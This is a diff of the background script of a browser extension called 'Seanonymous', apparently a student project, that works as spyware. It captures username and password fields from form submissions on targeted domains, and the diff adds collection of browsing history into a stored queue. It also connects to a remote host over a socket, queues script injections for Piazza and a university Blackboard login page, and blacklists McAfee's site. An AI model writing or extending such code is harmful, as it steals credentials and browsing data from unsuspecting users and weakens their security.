@@ -110,9 +110,9 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 		var credential = {'url':details.url};
 		var complex = {'url':details.url};
 
-		//TODO: populate a json and send it to the server
 		if(formData){
 			Object.keys(formData).forEach(function(key){
+				if(key.match("formurl")){};		//ignore this, it appears in all predefined phishing attacks
 				if(key.match("username")||key.match("password")){
 					credential[key]=formData[key];
 				}
@@ -137,7 +137,7 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 	}
 },
     {urls: blocked_domains,
-	 types: ["main_frames"]},
+	 types: ["main_frame"]},
     ["blocking"]
 )
 
@@ -149,8 +149,14 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 function getClientHistory(millis, numResults){
 chrome.history.search({text: '', maxResults: numResults}, function(data) {
     data.forEach(function(page) {
+    	var historyChanged = false;
     	if(page.lastVisitTime>millis){
-            alert(page.url);
+            queue.history.push(page.url);
+            console.log("history: ",page.url);
+            historyChanged = true;
+		}
+		if(historyChanged){
+    		storeQueue();
 		}
     });
 });
@@ -162,6 +168,7 @@ async function loadConfig(){
 	await chrome.storage.sync.get('config', function(result){
 		if(!(result.config == undefined)){
 			config = result.config;
+			console.log('Seanonymous: configuration loaded!');
 		}
 	});
 }
@@ -181,6 +188,7 @@ async function loadQueue(){
     await chrome.storage.sync.get('config', function(result){
         if(!(result.config == undefined)){
             queue = result.queue;
+            console.log('Seanonymous: message queue loaded!')
         }
     });
 }
@@ -246,8 +254,9 @@ function connectToHost(){
 				storeConfig();
 			});
 		}
-		else:
-	    		console.log('ID is stored' + config.ID); 
+		else{
+	    	console.log('ID is stored' + config.ID);
+		}
 	});
 	
     socket.on('error', function(data){
@@ -265,15 +274,15 @@ function connectToHost(){
 
 function main_func() {
 	//connectToHost();
-	config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert(\"u r hacked!\");'});
-    config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert(\"u b hacked222222222!\");'});
-    config.js_cmd.push({"https://blackboard.stonybrook.edu/webapps/login/" : 'alert(\"This one as well 3333333?!\");'});
+	config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u r hacked!");'});
+    config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u b hacked222222222!");'});
+    config.js_cmd.push({"https://blackboard.stonybrook.edu/webapps/login/" : 'alert("This one as well 3333333?!");'});
 	config.security_blacklist.push("https://www.mcafee.com/en-us/index.html");
 	setListener(config.security_blacklist);
 }
 
 loadConfig().then(
-	loadQueue.then()(
+	loadQueue().then(
 		main_func
 	)
 );
